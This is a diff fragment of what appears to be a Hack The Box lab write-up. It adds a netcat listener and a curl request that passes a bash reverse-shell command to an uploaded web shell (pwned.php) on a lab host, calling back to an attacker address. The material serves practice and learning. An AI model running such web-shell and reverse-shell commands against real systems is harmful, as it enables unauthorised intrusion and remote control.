@@ -74,6 +74,11 @@ curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=whoami'
 ![image](https://github.com/regarmulia/HTB/assets/33616880/726e93c7-7eaa-4d83-9219-6744746e6189)
 
 
+```
+nc -nlvp 1234
+curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.3/1234 0>&1"'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/ad41ebca-08db-4c49-ab26-25955092ca08)
 
 
 
